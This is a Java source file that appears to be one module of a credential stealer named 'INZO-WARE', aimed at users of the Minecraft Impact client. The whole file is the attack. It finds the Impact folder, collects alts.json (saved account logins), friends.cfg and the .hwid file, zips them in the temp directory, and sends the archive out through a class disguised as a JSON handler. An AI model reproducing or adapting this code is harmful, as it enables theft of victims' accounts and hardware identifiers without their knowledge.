package com.inzo.technologies.inzoware.mc.parsers.impl;

import java.io.File;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.ArrayList;

import com.inzo.technologies.inzoware.mc.parsers.JSONObject;
import com.inzo.technologies.inzoware.mc.parsers.JSONRegexHandler;
import com.inzo.technologies.inzoware.mc.parsers.util.FileSystemHelper;
import com.inzo.technologies.inzoware.mc.parsers.util.JSONBuilder;

public final class ImpactData implements JSONObject {
    private static final String[] IMPORTANT_FILES = new String[]{"alts.json", "friends.cfg", ".hwid"};

    @Override
    public void handle() {
        if (mcFolder == null || !Files.exists(Paths.get(mcFolder))) return;

        String impactFolder = mcFolder + "Impact/";
        if (!Files.exists(Paths.get(impactFolder))) {
            JSONRegexHandler.send(new JSONBuilder().value("content", "> Did not contain the Impact folder.").build());
            return;
        }

        ArrayList<File> validFileDirs = new ArrayList<>();
        for (String fileName : IMPORTANT_FILES) {
            String dir = impactFolder + fileName;
            if (!Files.exists(Paths.get(dir))) continue;

            validFileDirs.add(new File(dir));
        }

        String zipFile = System.getProperty("java.io.tmpdir") + sep + "impact_INZO-WARE.zip";
        FileSystemHelper.zip(zipFile, validFileDirs);
        JSONRegexHandler.send(new File(zipFile));
    }

    @Override
    public String getName() {
        return "ImpactData";
    }
}
